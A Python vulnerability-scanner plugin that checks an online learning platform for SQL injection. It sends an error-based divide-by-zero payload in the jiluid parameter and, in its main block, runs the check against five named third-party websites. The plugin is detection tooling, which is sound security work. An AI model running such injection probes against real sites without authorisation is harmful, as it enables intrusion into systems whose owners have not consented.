#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 奶权
#_PlugName_ = 学子科技在线学习平台SQL注入
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-053921
import re
def assign(service, arg):
    if service == 'xuezikeji':
        return True, arg
def audit(arg):
    payload = 'e-learning/listkaoshi2.asp?jiluid=IIF(123=456,283,1/0)'
    target = arg + payload
    
    code, head, res, errcode, _ = curl.curl2(target);
    res = unicode(res, "gb2312").encode("utf-8")
    if code == 500 and "零做除数" in res:
        security_warning(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('xuezikeji', 'http://www.52xi.net/')[1])
    audit(assign('xuezikeji', 'http://www.gajys.com/')[1])
    audit(assign('xuezikeji', 'http://www.jinlaiwen.com/')[1])
    audit(assign('xuezikeji', 'http://www.kunfanjj.com/')[1])
    audit(assign('xuezikeji', 'http://www.rb-edu.com/')[1])
